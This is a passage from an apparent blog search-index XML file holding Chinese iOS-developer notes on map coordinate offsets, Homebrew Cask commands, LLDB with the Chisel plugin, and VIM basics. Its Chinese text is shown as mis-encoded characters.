markerInfoWindowï¼šæ–¹æ³•åªéœ€è¦åˆå§‹åŒ–æŽ§ä»¶å³å¯ï¼Œåœ¨èŽ·å–åˆ°æ•°æ®è®¾ç½®GMSMarkerçš„æ–¹æ³•é‡Œä¼ é€’æ•°æ® æƒ³è¦åˆ·æ–°æ•°æ®è¦è®¾ç½® tracksInfoWindowChanges = YES åœ¨å›½å†…ç›´æŽ¥ä½¿ç”¨GPSåŽŸå§‹åæ ‡æ˜¾ç¤ºåœ¨åœ°å›¾ä¸Šé¢ä¼šæœ‰åç§» å¯ä»¥ä½¿ç”¨ç½‘ä¸Šåˆ«äººcè¯­è¨€å†™çš„ä¸€äº›çº åç®—æ³•ï¼Œçº ååŽåç§»ä¸æ˜¯å¾ˆå¤§ï¼ˆçº ååªé’ˆå¯¹å›½å†…ï¼Œå¯ä»¥ä½¿ç”¨ç»çº¬åº¦åŒºåˆ†å›½å†…è¿˜æ˜¯å›½å¤–çš„åŒºåŸŸï¼Œä¸æ˜¯éžå¸¸å‡†ç¡®ï¼‰ é«˜å¾·åœ°å›¾å’Œç™¾åº¦åœ°å›¾SDKé‡Œé¢æœ‰æä¾›å›½å†…å¤–åŒºåŸŸåˆ¤æ–­çš„Apiï¼Œæä¾›ä¸€ä¸ªåæ ‡ç‚¹åˆ¤æ–­æ˜¯åœ¨å›½å†…è¿˜æ˜¯åœ¨å›½å¤– Google Maps æ”¶è´¹The Google Maps Geolocation API æ™®é€šç”¨æˆ· æ¯å¤©å¯ä»¥è°ƒç”¨2500æ¬¡ï¼Œæ¯ç§’è°ƒç”¨50æ¬¡ è¶…è¿‡åŽæŒ‰æ¯1000æ¬¡/0.5ç¾Žå…ƒæ”¶è´¹ï¼ˆè¿˜æ˜¯æœ‰è°ƒç”¨é™åˆ¶ï¼šæ¯å¤©ä¸Šé™:100000æ¬¡ï¼‰ é«˜çº§ç”¨æˆ· é«˜çº§ç”¨æˆ·éœ€è¦å’ŒGoogleå…¬å¸è”ç³»ï¼Œå¯ä»¥æŒ‰åè®®ä»˜è´¹æé«˜è°ƒç”¨æ¬¡æ•°é™åˆ¶ ä½†æ˜¯åªèƒ½é’ˆå¯¹å›½å¤–çš„å…¬å¸ï¼ˆä¸å¯¹å›½å†…å…¬å¸æä¾›æœåŠ¡ï¼‰ï¼Œè´¦å•ä»˜è´¹ä¹Ÿå¿…é¡»æ˜¯å›½å¤–çš„å…¬å¸ è§£å†³æ–¹æ³• ï¼ˆè°ƒç”¨é«˜å¾·æœåŠ¡ï¼‰ é«˜å¾·åœ°å›¾é’ˆå¯¹æ²¡æœ‰å¼€å‘å¯¹åº”çš„iOSå’ŒAndroidçš„å®¢æˆ·ç«¯çš„æ™ºèƒ½ç¡¬ä»¶äº§å“çš„ä¼ä¸šç”¨æˆ·, æä¾›æ™ºèƒ½ç¡¬ä»¶å®šä½æœåŠ¡ï¼Œæ”¯æŒé€šè¿‡æœåŠ¡ç«¯ä¸Šä¼ WIFIå’ŒåŸºç«™ä¿¡æ¯è¿›è¡Œå®šä½å¹¶èŽ·å–ç»çº¬åº¦ã€‚ éœ€è¦å¼€å‘è€…è´¦å·æ³¨å†Œä¸ºä¼ä¸šç”¨æˆ· å…è´¹è°ƒç”¨é™åˆ¶ä¸º3000000æ¬¡/æ¯å¤© åŒGoogle Maps Geolocation API å°†è®¾å¤‡GPSèŽ·å–åˆ°çš„Wifiå’ŒLbæ•°æ®æˆ–è€…Cell Toweræ•°æ®è½¬æ¢ä¸ºå¯¹åº”çš„ç»çº¬åº¦ä¿¡æ¯ é«˜å¾·è½¬å‡ºæ¥çš„ä¸ºGCJï¼02åæ ‡ä½“ç³»ï¼ˆç«æ˜Ÿåæ ‡ï¼‰ æœ‰å›½å¤–çš„æ•°æ®æ”¯æŒï¼Œä½†æ˜¯å…·ä½“çš„ç²¾å‡†çš„è¿˜éœ€è¦å†æµ‹è¯• åœ°å›¾åæ ‡ä½“ç³»è½¬æ¢ åœ°å›¾çš„SDKä¸€èˆ¬ä¼šæä¾›å…¶ä»–åœ°å›¾åæ ‡ä½“ç³»åˆ°è‡ªèº«ä½“ç³»çš„è½¬æ¢æŽ¥å£ ä½†æ˜¯ å‡ä¸æä¾›ä»Žè‡ªèº«å‘å…¶ä»–åæ ‡ä½“ç³»è½¬æ¢ google SDKæ²¡æœ‰åæ ‡è½¬æ¢æŽ¥å£ åˆ«äººå†™çš„è½¬æ¢æ–¹æ³•ã€æœ‰è¯¯å·® https://github.com/JackZhouCn/JZLocationConverter åˆ«äººå†™çš„æœåŠ¡å™¨ï¼ˆC#ç‰ˆï¼‰åæ ‡è½¬æ¢ https://www.jianshu.com/p/8975586a820e]]></content>
      <categories>
        <category>iOS</category>
        <category>åœ°å›¾</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>åœ°å›¾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Homebrewä»‹ç»]]></title>
    <url>%2Farchives%2F4f2aa8f3.html</url>
    <content type="text"><![CDATA[Homebrew å®‰è£…åŠä½¿ç”¨å’Œå¸¸ç”¨çš„æ‰©å±•ã€‚ iOSå¼€å‘å·¥å…·ä¹‹Homebrewç¯‡Homebrewå®˜ç½‘ https://brew.sh/index_zh-cn.htmlHomebrew æ˜¯åŸºäºŽ OS X çš„å¥—ä»¶ç®¡ç†å·¥å…·ï¼Œæ˜¯ä¸€ä¸ªå¼€æºçš„ Ruby è„šæœ¬ï¼Œä¸“é—¨ç”¨äºŽå¿«é€Ÿä¸‹è½½è½¯ä»¶ Homebrew ç±»ä¼¼äºŽä¸€ä¸ªè½¯ä»¶ä¸­å¿ƒï¼Œå¯ä»¥ç†è§£æˆ App Store æˆ–è€… Google Play é‚£æ ·çš„è½¯ä»¶å•†åº—, ä¸”å†…å®¹æ›´åŠ ä¸°å¯Œ; Homebrew Caskï¼Œå®ƒæ˜¯ä¸€å¥—å»ºç«‹åœ¨ Homebrew åŸºç¡€ä¹‹ä¸Šçš„ OS X è½¯ä»¶å®‰è£…å‘½ä»¤è¡Œå·¥å…·ï¼Œæ˜¯ Homebrew çš„æ‰©å±•;ä½¿ç”¨Homebrewæœ‰ä»€ä¹ˆä¼˜åŠ¿å‘¢? é€šè¿‡ Homebrew ä¸‹è½½å®‰è£…çš„è½¯ä»¶å…¨éƒ¨æ¥è‡ªå¯¹åº”çš„è½¯ä»¶å®˜ç½‘ï¼Œæ— éœ€æ‹…å¿ƒä¸‹è½½æºçš„å®‰å…¨é—®é¢˜; ä¾å­˜äºŽç³»ç»Ÿæ—¢æœ‰çš„åº“ï¼Œå‡å°‘äº†ç©ºé—´å ç”¨å’Œå†—ä½™; ä½¿ç”¨ Git è¿›è¡Œç®¡ç†å’Œæ›´æ–°; æ˜“äºŽå®šåˆ¶; Homebrew ä½¿ç”¨ï¼š å®‰è£…è½¯ä»¶ brew cask install è½¯ä»¶å 1brew cask install google-chrome å¸è½½è½¯ä»¶ brew cask uninstall è½¯ä»¶å 1brew cask uninstall google-chrome è½¯ä»¶æœç´¢ brew cask search è½¯ä»¶å 1brew cask search google æŸ¥çœ‹è½¯ä»¶ç›¸å…³ä¿¡æ¯ brew cask info è½¯ä»¶å 1brew cask info google-chrome åˆ é™¤ Homebrew Cask ä¸‹è½½çš„åŒ… 1brew cask cleanup åˆ—å‡ºé€šè¿‡ Homebrew Cask å®‰è£…çš„åŒ… 1brew cask list æ›´æ–° Homebrew Cask 1brew cask update Homebrew å®‰è£…QuickLookå¸¸ç”¨çš„æ’ä»¶QuickLookæ’ä»¶http://www.quicklookplugins.com/ brew cask install qlmarkdown // é¢„è§ˆMarkdown QLColorCode // ä»£ç å—é«˜äº® QuickLook-JSON // JSON æ–‡ä»¶ QLPrettyPatch // Patch æ–‡ä»¶ qlvideo // è§†é¢‘é¢„è§ˆ QLStephen // é¢„è§ˆæ— æ‹“å±•åçš„çº¯æ–‡æœ¬æ–‡ä»¶ BetterZipQL // æŸ¥çœ‹ Zip åŽ‹ç¼©æ–‡ä»¶çš„ä¿¡æ¯ä»¥åŠæ–‡ä»¶ç›®å½• QLImageSize // é¢„è§ˆçª—å£çš„æ ‡é¢˜æ ä¸­æ˜¾ç¤ºå›¾ç‰‡åˆ†è¾¨çŽ‡åŠæ–‡ä»¶å¤§å°ï¼Œå¹¶åœ¨ Finder ä¸­æ˜¾ç¤ºå›¾ç‰‡çš„æ ¼å¼; è¿˜æ”¯æŒ bpgã€Portable Pixmapã€WebP æ ¼å¼ QuickLook-CSV // é¢„è§ˆ CSV æ–‡ä»¶ qladdict // .srt (Subtitle)]]></content>
      <categories>
        <category>å·¥å…·</category>
      </categories>
      <tags>
        <tag>Homebrew</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LLDBä»‹ç»]]></title>
    <url>%2Farchives%2Fc9e6c86c.html</url>
    <content type="text"><![CDATA[LLDB å…¥é—¨ä»‹ç»åŠChiselå®‰è£…ä½¿ç”¨ã€‚ iOSå¼€å‘å·¥å…·ä¹‹LLDBä»‹ç¯‡ LLDB æ˜¯ä¸€ä¸ªæœ‰ç€ REPL çš„ç‰¹æ€§å’Œ C++ ,Python æ’ä»¶çš„å¼€æºè°ƒè¯•å™¨ã€‚LLDB ç»‘å®šåœ¨ Xcode å†…éƒ¨ï¼Œå­˜åœ¨äºŽä¸»çª—å£åº•éƒ¨çš„æŽ§åˆ¶å°ä¸­ã€‚ å®‰è£…Chisel Facebook å¼€æºçš„ lldb æ’ä»¶ Chisel. 1ã€Chisel ä½¿ç”¨ homebrew æ¥å®‰è£…ï¼Œå¦‚æžœä½ æ²¡æœ‰å®‰è£…homebrew 12brew updatebrew install chisel 2ã€å®‰è£…å®ŒæˆæŒ‰ç…§å®‰è£…æ—¥å¿—ä¸Šçš„æç¤ºï¼Œåœ¨~/.lldbinitæ–‡ä»¶ä¸­æ·»åŠ ä¸€è¡Œï¼Œæ²¡æœ‰åˆ™æ–°å»ºã€‚ æç¤ºç±»ä¼¼å¦‚ä¸‹ï¼š 123==&gt; CaveatsAdd the following line to ~/.lldbinit to load chisel when Xcode launches:command script import /usr/local/opt/chisel/libexec/fblldb.py 3ã€ç„¶åŽé‡å¯Xcode å¸¸ç”¨çš„è°ƒè¯•æŒ‡ä»¤pjson æ‰“å°jsonæ ¼å¼æ•°æ®ï¼Œè°ƒè¯•æœåŠ¡å™¨è¿”å›žæ•°æ®æ—¶å€™ç”¨ã€‚ p/x æ‰“å°16è¿›åˆ¶æ•°æ® p/t æ‰“å°2è¿›åˆ¶æ•°æ® e ä¿®æ”¹å±žæ€§å’Œè°ƒç”¨æ–¹æ³• pviews è¿™ä¸ªå‘½ä»¤å¯ä»¥é€’å½’æ‰“å°æ‰€æœ‰çš„viewï¼Œå¹¶èƒ½æ ‡ç¤ºå±‚çº§ï¼Œç›¸å½“äºŽ UIView çš„ç§æœ‰è¾…åŠ©æ–¹æ³• [view recursiveDescription]ã€‚ å–„ç”¨ä½¿ç”¨è¿™ä¸ªåŠŸèƒ½ä¼šè®©ä½ åœ¨è°ƒè¯•å®šä½é—®é¢˜æ—¶çœåŽ»å¾ˆå¤šéº»çƒ¦ã€‚ pvc ä¸ªå‘½ä»¤ä¹Ÿæ˜¯é€’å½’æ‰“å°å±‚çº§ï¼Œä½†æ˜¯ä¸æ˜¯viewï¼Œè€Œæ˜¯viewControllerã€‚åˆ©ç”¨å®ƒæˆ‘ä»¬å¯ä»¥å¯¹viewControllerçš„ç»“æž„ä¸€ç›®äº†ç„¶ã€‚ å…¶å®žè‹¹æžœåœ¨IOS8ä¹Ÿé»˜é»˜çš„æ·»åŠ äº† UIViewController çš„ä¸€ä¸ªç§æœ‰è¾…åŠ©æ–¹æ³• [UIViewController _printHierarchy]åŒæ ·çš„æ•ˆæžœã€‚ visualize è¿™æ˜¯ä¸ªå¾ˆæœ‰æ„æ€çš„åŠŸèƒ½ï¼Œå®ƒå¯ä»¥è®©ä½ ä½¿ç”¨Macçš„é¢„è§ˆæ‰“å¼€ä¸€ä¸ª UIImage, CGImageRef, UIView, æˆ– CALayerã€‚ è¿™ä¸ªåŠŸèƒ½æˆ–è®¸å¯ä»¥å¸®æˆ‘ä»¬ç”¨æ¥æˆªå›¾ã€ç”¨æ¥å®šä½ä¸€ä¸ªviewçš„å…·ä½“å†…å®¹ã€‚ ä½†æ˜¯åœ¨æˆ‘è¯•ç”¨äº†ä¸€ä¸‹ï¼Œå‘çŽ°æš‚æ—¶è¿˜æ˜¯åªèƒ½åœ¨æ¨¡æ‹Ÿå™¨æ—¶ä½¿ç”¨ï¼ŒçœŸæœºè¿˜ä¸è¡Œã€‚ fv &amp; fvc fvå’Œ fvcè¿™ä¸¤ä¸ªå‘½ä»¤æ˜¯ç”¨æ¥é€šè¿‡ç±»åæœç´¢å½“å‰å†…å­˜ä¸­å­˜åœ¨çš„viewå’ŒviewControllerå®žä¾‹çš„å‘½ä»¤ï¼Œæ”¯æŒæ­£åˆ™æœç´¢ã€‚ show &amp; hide è¿™ä¸¤ä¸ªå‘½ä»¤ç”¨æ¥æ˜¾ç¤ºå’Œéšè—ä¸€ä¸ªæŒ‡å®šçš„ UIView . ä½ ç”šè‡³ä¸éœ€è¦Continue Progress. å°±å¯ä»¥çœ‹åˆ°æ•ˆæžœã€‚ mask/umask border/unborder è¿™ä¸¤ç»„å‘½ä»¤ç”¨æ¥æ ‡è¯†ä¸€ä¸ªviewæˆ–layerçš„ä½ç½®æ—¶ç”¨ï¼Œ maskç”¨æ¥åœ¨viewä¸Šè¦†ç›–ä¸€ä¸ªåŠé€æ˜Žçš„çŸ©å½¢ï¼Œ borderå¯ä»¥ç»™viewæ·»åŠ è¾¹æ¡†ã€‚ä½†æ˜¯åœ¨æˆ‘å®žé™…ä½¿ç”¨çš„è¿‡ç¨‹ä¸­maskæ€»æ˜¯ä¼šæŠ¥é”™ï¼Œä¼°è®¡æ˜¯æœ‰bugï¼Œ é‚£ä¹ˆmask/unmask ä¸€èˆ¬ä¸è¦ç”¨å¥½äº†ï¼Œç”¨borderå‘½ä»¤æ˜¯ä¸€æ ·çš„æ•ˆæžœï¼Œåæ­£äºŒè€…çš„ç”¨é€”éƒ½æ˜¯æ‰¾åˆ°ä¸€ä¸ªå¯¹åº”çš„view. caflush è¿™ä¸ªå‘½ä»¤ä¼šé‡æ–°æ¸²æŸ“ï¼Œå³å¯ä»¥é‡æ–°ç»˜åˆ¶ç•Œé¢ï¼Œ ç›¸å½“äºŽæ‰§è¡Œäº† [CATransaction flush] æ–¹æ³•ï¼Œè¦æ³¨æ„å¦‚æžœåœ¨åŠ¨ç”»è¿‡ç¨‹ä¸­æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œå°±ç›´æŽ¥æ¸²æŸ“å‡ºåŠ¨ç”»ç»“æŸçš„æ•ˆæžœã€‚ å½“ä½ æƒ³åœ¨è°ƒè¯•ç•Œé¢é¢œè‰²ã€åæ ‡ä¹‹ç±»çš„æ—¶å€™ï¼Œå¯ä»¥ç›´æŽ¥åœ¨æŽ§åˆ¶å°ä¿®æ”¹å±žæ€§ï¼Œç„¶åŽcaflushå°±å¯ä»¥çœ‹åˆ°æ•ˆæžœå•¦ï¼Œæ˜¯ä¸æ˜¯è¦æ¯”æ”¹ä»£ç ï¼Œç„¶åŽé‡æ–°buildçœäº‹å¤šäº†å‘¢ã€‚ bmessage è¿™ä¸ªå‘½ä»¤å°±æ˜¯ç”¨æ¥æ‰“æ–­ç‚¹ç”¨çš„äº†ï¼Œè™½ç„¶å¤§å®¶æ–­ç‚¹å¯èƒ½éƒ½å–œæ¬¢åœ¨å›¾å½¢ç•Œé¢é‡Œé¢æ‰“ï¼Œä½†æ˜¯è€ƒè™‘ä¸€ç§æƒ…å†µï¼šæˆ‘ä»¬æƒ³åœ¨[MyViewController viewWillAppear:] é‡Œé¢æ‰“æ–­ç‚¹ï¼Œä½†æ˜¯ MyViewControllerå¹¶æ²¡æœ‰å®žçŽ° viewWillAppear:æ–¹æ³•ï¼Œ ä»¥å¾€çš„ä½œæ³•å¯èƒ½å°±æ˜¯åœ¨å­ç±»ä¸­å®žçŽ°ä¸‹viewWillAppear:ï¼Œç„¶åŽæ‰“æ–­ç‚¹ï¼Œç„¶åŽrebuildã€‚ é‚£ä¹ˆå¹¸å¥½æœ‰äº† bmessageå‘½ä»¤ã€‚æˆ‘ä»¬å¯ä»¥ä¸ç”¨è¿™æ ·å°±å¯ä»¥æ‰“è¿™ä¸ªæ•ˆæžœçš„æ–­ç‚¹ï¼š (lldb) bmessage -[MyViewController viewWillAppear:]ä¸Šé¢å‘½ä»¤ä¼šåœ¨å…¶çˆ¶ç±»çš„ viewWillAppear: æ–¹æ³•ä¸­æ‰“æ–­ç‚¹ï¼Œå¹¶æ·»åŠ ä¸Šäº†æ¡ä»¶ï¼š[self isKindOfClass:[MyViewController class]] help å¯ä»¥ç”¨å¸®åŠ©æ–‡æ¡£æŸ¥çœ‹æ‰€æœ‰çš„æŒ‡ä»¤æˆ–è€…å•ä¸ªæŒ‡ä»¤çš„ä½¿ç”¨æ–¹æ³• å¸¸ç”¨çš„Debugå¿«æ·é”®1234567891011121314151617cmd + ctrl + Y // æš‚åœ/ç»§ç»­cmd + Y // æ–­ç‚¹å¤±æ•ˆ/ç”Ÿæ•ˆcmd + shift + Y // æŽ§åˆ¶å°æ˜¾ç¤º/éšè—cmd + shift + C // å…‰æ ‡åˆ‡æ¢åˆ°æŽ§åˆ¶å°cmd + K // æ¸…ç©ºæŽ§åˆ¶å°continue \(c\) // ç»§ç»­æ‰§è¡Œstep over F6 ï¼ˆnï¼‰ // å•æ­¥æ‰§è¡Œstep into F7ï¼ˆsï¼‰ // è·³å…¥step out F8 ï¼ˆfinishï¼‰// è·³å‡º]]></content>
      <categories>
        <category>å·¥å…·</category>
      </categories>
      <tags>
        <tag>LLDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VIMä»‹ç»]]></title>
    <url>%2Farchives%2F1c40fe4d.html</url>
    <content type="text"><![CDATA[VIM æ—¥å¸¸ä½¿ç”¨åŠæ³¨æ„ç‚¹ã€‚ iOSå¼€å‘å·¥å…·ä¹‹VIMç¯‡VIMç›¸å…³çš„æŒ‡ä»¤ viç¼–è¾‘å™¨æ˜¯æ‰€æœ‰UnixåŠLinuxç³»ç»Ÿä¸‹æ ‡å‡†çš„ç¼–è¾‘å™¨ï¼Œå®ƒçš„å¼ºå¤§ä¸é€Šè‰²äºŽä»»ä½•æœ€æ–°çš„æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œè¿™é‡Œåªæ˜¯ç®€å•åœ°ä»‹ç»ä¸€ä¸‹å®ƒçš„ç”¨æ³•å’Œä¸€å°éƒ¨åˆ†æŒ‡ä»¤ã€‚ ç”±äºŽå¯¹UnixåŠLinuxç³»ç»Ÿçš„ä»»ä½•ç‰ˆæœ¬ï¼Œviç¼–è¾‘å™¨æ˜¯å®Œå…¨ç›¸åŒçš„ï¼Œå› æ­¤æ‚¨å¯ä»¥åœ¨å…¶ä»–ä»»ä½•ä»‹ç»viçš„åœ°æ–¹è¿›ä¸€æ­¥äº†è§£å®ƒã€‚Viä¹Ÿæ˜¯Linuxä¸­æœ€åŸºæœ¬çš„æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå­¦ä¼šå®ƒåŽï¼Œæ‚¨å°†åœ¨Linuxçš„ä¸–ç•Œé‡Œç•…è¡Œæ— é˜»ã€‚ æ‰“å¼€12345vim ç›´æŽ¥å¯åŠ¨vimvim filename æ‰“å¼€vimå¹¶åˆ›å»ºåä¸ºfilenameçš„æ–‡ä»¶ // æ‰“å¼€å•ä¸ªæ–‡ä»¶vim file1 file2 file3 â€¦ // æ‰“å¼€å¤šä¸ªæ–‡ä»¶:open file // åœ¨vimçª—å£ä¸­æ‰“å¼€ä¸€ä¸ªæ–°æ–‡ä»¶:split file // åœ¨æ–°çª—å£ä¸­æ‰“å¼€æ–‡ä»¶ é€€å‡ºæŒ‡ä»¤12345678:w ä¿å­˜æ–‡ä»¶ä½†ä¸é€€å‡ºvi:w file å°†ä¿®æ”¹å¦å¤–ä¿å­˜åˆ°fileä¸­ï¼Œä¸é€€å‡ºvi:w! å¼ºåˆ¶ä¿å­˜ï¼Œä¸æŽ¨å‡ºvi:wq ä¿å­˜æ–‡ä»¶å¹¶é€€å‡ºvi:wq! å¼ºåˆ¶ä¿å­˜æ–‡ä»¶ï¼Œå¹¶é€€å‡ºvi:q ä¸ä¿å­˜æ–‡ä»¶ï¼Œé€€å‡ºvi:q! ä¸ä¿å­˜æ–‡ä»¶ï¼Œå¼ºåˆ¶é€€å‡ºvi:e! æ”¾å¼ƒæ‰€æœ‰ä¿®æ”¹ï¼Œä»Žä¸Šæ¬¡ä¿å­˜æ–‡ä»¶å¼€å§‹å†ç¼–è¾‘å‘½ä»¤åŽ†å² 1ã€viçš„åŸºæœ¬æ¦‚å¿µ åŸºæœ¬ä¸Šviå¯ä»¥åˆ†ä¸ºä¸‰ç§çŠ¶æ€ï¼Œåˆ†åˆ«æ˜¯å‘½ä»¤æ¨¡å¼ï¼ˆcommand modeï¼‰ã€æ’å…¥æ¨¡å¼ï¼ˆInsertmodeï¼‰å’Œåº•è¡Œæ¨¡å¼ï¼ˆlast line modeï¼‰ï¼Œå„æ¨¡å¼çš„åŠŸèƒ½åŒºåˆ†å¦‚ä¸‹ï¼š 1) å‘½ä»¤è¡Œæ¨¡å¼(command modeï¼‰ æŽ§åˆ¶å±å¹•å…‰æ ‡çš„ç§»åŠ¨ï¼Œå­—ç¬¦ã€å­—æˆ–è¡Œçš„åˆ é™¤ï¼Œç§»åŠ¨å¤åˆ¶æŸåŒºæ®µåŠè¿›å…¥Insert modeä¸‹ï¼Œæˆ–è€…åˆ° last line modeã€‚ 2) æ’å…¥æ¨¡å¼ï¼ˆInsert modeï¼‰ åªæœ‰åœ¨Insert modeä¸‹ï¼Œæ‰å¯ä»¥åšæ–‡å­—è¾“å…¥ï¼ŒæŒ‰ã€ŒESCã€é”®å¯å›žåˆ°å‘½ä»¤è¡Œæ¨¡å¼ã€‚ 3) åº•è¡Œæ¨¡å¼ï¼ˆlast line modeï¼‰ å°†æ–‡ä»¶ä¿å­˜æˆ–é€€å‡ºviï¼Œä¹Ÿå¯ä»¥è®¾ç½®ç¼–è¾‘çŽ¯å¢ƒï¼Œå¦‚å¯»æ‰¾å­—ç¬¦ä¸²ã€åˆ—å‡ºè¡Œå·â€¦â€¦ç­‰ã€‚ ä¸è¿‡ä¸€èˆ¬æˆ‘ä»¬åœ¨ä½¿ç”¨æ—¶æŠŠviç®€åŒ–æˆä¸¤ä¸ªæ¨¡å¼ï¼Œå°±æ˜¯å°†åº•è¡Œæ¨¡å¼ï¼ˆlast line modeï¼‰ä¹Ÿç®—å…¥å‘½ä»¤è¡Œæ¨¡å¼command modeï¼‰ã€‚ 2ã€viçš„åŸºæœ¬æ“ä½œ a) è¿›å…¥vi åœ¨ç³»ç»Ÿæç¤ºç¬¦å·è¾“å…¥viåŠæ–‡ä»¶åç§°åŽï¼Œå°±è¿›å…¥viå…¨å±å¹•ç¼–è¾‘ç”»é¢ï¼š 1$ vi myfile ä¸è¿‡æœ‰ä¸€ç‚¹è¦ç‰¹åˆ«æ³¨æ„ï¼Œå°±æ˜¯æ‚¨è¿›å…¥viä¹‹åŽï¼Œæ˜¯å¤„äºŽã€Œå‘½ä»¤è¡Œæ¨¡å¼ï¼ˆcommand modeï¼‰ã€ï¼Œæ‚¨è¦åˆ‡æ¢åˆ°ã€Œæ’å…¥æ¨¡å¼ï¼ˆInsert modeï¼‰ã€æ‰èƒ½å¤Ÿè¾“å…¥æ–‡å­—ã€‚åˆæ¬¡ä½¿ç”¨viçš„äººéƒ½ä¼šæƒ³å…ˆç”¨ä¸Šä¸‹å·¦å³é”®ç§»åŠ¨å…‰æ ‡ï¼Œç»“æžœç”µè„‘ä¸€ç›´å“”å“”å«ï¼ŒæŠŠè‡ªå·±æ°”ä¸ªåŠæ­»ï¼Œæ‰€ä»¥è¿›å…¥viåŽï¼Œå…ˆä¸è¦ä¹±åŠ¨ï¼Œè½¬æ¢åˆ°ã€Œæ’å…¥æ¨¡å¼ï¼ˆInsert modeï¼‰ã€å†è¯´å§ï¼ b) åˆ‡æ¢è‡³æ’å…¥æ¨¡å¼ï¼ˆInsert modeï¼‰ç¼–è¾‘æ–‡ä»¶ åœ¨ã€Œå‘½ä»¤è¡Œæ¨¡å¼ï¼ˆcommand modeï¼‰ã€ä¸‹æŒ‰ä¸€ä¸‹å­—æ¯ã€Œiã€å°±å¯ä»¥è¿›å…¥ã€Œæ’å…¥æ¨¡å¼ï¼ˆInsert modeï¼‰ã€ï¼Œè¿™æ—¶å€™ä½ å°±å¯ä»¥å¼€å§‹è¾“å…¥æ–‡å­—äº†ã€‚ c) Insert çš„åˆ‡æ¢ æ‚¨ç›®å‰å¤„äºŽã€Œæ’å…¥æ¨¡å¼ï¼ˆInsert modeï¼‰ã€ï¼Œæ‚¨å°±åªèƒ½ä¸€ç›´è¾“å…¥æ–‡å­—ï¼Œå¦‚æžœæ‚¨å‘çŽ°è¾“é”™äº†å­—ï¼æƒ³ç”¨å…‰æ ‡é”®å¾€å›žç§»åŠ¨ï¼Œå°†è¯¥å­—åˆ é™¤ï¼Œå°±è¦å…ˆæŒ‰ä¸€ä¸‹ã€ŒESCã€é”®è½¬åˆ°ã€Œå‘½ä»¤è¡Œæ¨¡å¼ï¼ˆcommand modeï¼‰ã€å†åˆ é™¤æ–‡å­— d) é€€å‡ºviåŠä¿å­˜æ–‡ä»¶ åœ¨ã€Œå‘½ä»¤è¡Œæ¨¡å¼ï¼ˆcommand modeï¼‰ã€ä¸‹ï¼ŒæŒ‰ä¸€ä¸‹ã€Œï¼šã€å†’å·é”®è¿›å…¥ã€ŒLast line modeã€ï¼Œä¾‹å¦‚ï¼š 12345: w filename // ï¼ˆè¾“å…¥ ã€Œw filenameã€å°†æ–‡ç« ä»¥æŒ‡å®šçš„æ–‡ä»¶åfilenameä¿å­˜ï¼‰: wq // (è¾“å…¥ã€Œwqã€ï¼Œå­˜ç›˜å¹¶é€€å‡ºvi): q! // (è¾“å…¥q!ï¼Œ ä¸å­˜ç›˜å¼ºåˆ¶é€€å‡ºvi) 3ã€å‘½ä»¤è¡Œæ¨¡å¼ï¼ˆcommand modeï¼‰åŠŸèƒ½é”® 1ï¼‰. æ’å…¥æ¨¡å¼ æŒ‰ã€Œiã€åˆ‡æ¢è¿›å…¥æ’å…¥æ¨¡å¼ã€Œinsert modeã€ï¼ŒæŒ‰â€œiâ€è¿›å…¥æ’å…¥æ¨¡å¼åŽæ˜¯ä»Žå…‰æ ‡å½“å‰ä½ç½®å¼€å§‹è¾“å…¥æ–‡ä»¶ï¼› æŒ‰ã€Œaã€è¿›å…¥æ’å…¥æ¨¡å¼åŽï¼Œæ˜¯ä»Žç›®å‰å…‰æ ‡æ‰€åœ¨ä½ç½®çš„ä¸‹ä¸€ä¸ªä½ç½®å¼€å§‹è¾“å…¥æ–‡å­—ï¼› æŒ‰ã€Œoã€è¿›å…¥æ’å…¥æ¨¡å¼åŽï¼Œæ˜¯æ’å…¥æ–°çš„ä¸€è¡Œï¼Œä»Žè¡Œé¦–å¼€å§‹è¾“å…¥æ–‡å­—ã€‚ 2ï¼‰. ä»Žæ’å…¥æ¨¡å¼åˆ‡æ¢ä¸ºå‘½ä»¤è¡Œæ¨¡å¼ æŒ‰ã€ŒESCã€é”®ã€‚ 3ï¼‰. ç§»åŠ¨å…‰æ ‡ viå¯ä»¥ç›´æŽ¥ç”¨é”®ç›˜ä¸Šçš„å…‰æ ‡æ¥ä¸Šä¸‹å·¦å³ç§»åŠ¨ï¼Œä½†æ­£è§„çš„viæ˜¯ç”¨å°å†™è‹±æ–‡å­—æ¯ã€Œhã€ã€ã€Œjã€ã€ã€Œkã€ã€ã€Œlã€ï¼Œåˆ†åˆ«æŽ§åˆ¶å…‰æ ‡å·¦ã€ä¸‹ã€ä¸Šã€å³ç§»ä¸€æ ¼ã€‚ æŒ‰ã€Œctrlã€+ã€Œbã€ï¼šå±å¹•å¾€â€œåŽâ€ç§»åŠ¨ä¸€é¡µã€‚ æŒ‰ã€Œctrlã€+ã€Œfã€ï¼šå±å¹•å¾€â€œå‰â€ç§»åŠ¨ä¸€é¡µã€‚ æŒ‰ã€Œctrlã€+ã€Œuã€ï¼šå±å¹•å¾€â€œåŽâ€ç§»åŠ¨åŠé¡µã€‚ æŒ‰ã€Œctrlã€+ã€Œdã€ï¼šå±å¹•å¾€â€œå‰â€ç§»åŠ¨åŠé¡µã€‚ æŒ‰æ•°å­—ã€Œ0ã€ï¼šç§»åˆ°æ–‡ç« çš„å¼€å¤´ã€‚ æŒ‰ã€ŒGã€ï¼šç§»åŠ¨åˆ°æ–‡ç« çš„æœ€åŽã€‚ æŒ‰ã€Œ$ã€ï¼šç§»åŠ¨åˆ°å…‰æ ‡æ‰€åœ¨è¡Œçš„â€œè¡Œå°¾â€ã€‚ æŒ‰ã€Œ^ã€ï¼šç§»åŠ¨åˆ°å…‰æ ‡æ‰€åœ¨è¡Œçš„â€œè¡Œé¦–â€ æŒ‰ã€Œwã€ï¼šå…‰æ ‡è·³åˆ°ä¸‹ä¸ªå­—çš„å¼€å¤´ æŒ‰ã€Œeã€ï¼šå…‰æ ‡è·³åˆ°ä¸‹ä¸ªå­—çš„å­—å°¾ æŒ‰ã€Œbã€ï¼šå…‰æ ‡å›žåˆ°ä¸Šä¸ªå­—çš„å¼€å¤´ æŒ‰ã€Œ#lã€ï¼šå…‰æ 